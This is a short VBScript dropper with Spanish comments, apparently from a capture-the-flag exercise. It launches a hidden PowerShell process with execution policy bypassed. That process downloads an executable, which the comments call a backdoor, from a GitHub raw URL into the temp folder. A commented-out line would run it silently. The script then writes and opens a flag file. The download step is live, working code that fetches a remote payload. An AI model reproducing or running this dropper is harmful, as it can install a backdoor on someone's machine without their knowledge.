Set sh = CreateObject("WScript.Shell")
tempPath = sh.ExpandEnvironmentStrings("%TEMP%")

' 1) Descarga el backdoor
cmdDownload = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
              """Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ahuici/CrowCable-Payload-ahuici/main/wifiAdapter.exe' " & _
              "-OutFile '$env:TEMP\wifiAdapter.exe'"""

sh.Run cmdDownload, 0, True   'True = espera a que termine la descarga[web:32][web:51]

' 2) Ejecutar wifiAdapter.exe desde %TEMP%
' exePath = """" & tempPath & "\wifiAdapter.exe" & """"
' sh.Run exePath, 0, False      '0 = oculto, False = no espera a que termine

' 3) Crear un TXT con la flag y abrirlo en Notepad
Set fso = CreateObject("Scripting.FileSystemObject")
flagPath = tempPath & "\flag_ctf.txt"

Set f = fso.CreateTextFile(flagPath, True)
f.WriteLine "Fin experimento, flag descubierta ctf{alm0st_a_b4ckd00r}"
f.Close

' Abrir el archivo en Bloc de notas
sh.Run "notepad.exe """ & flagPath & """", 1, False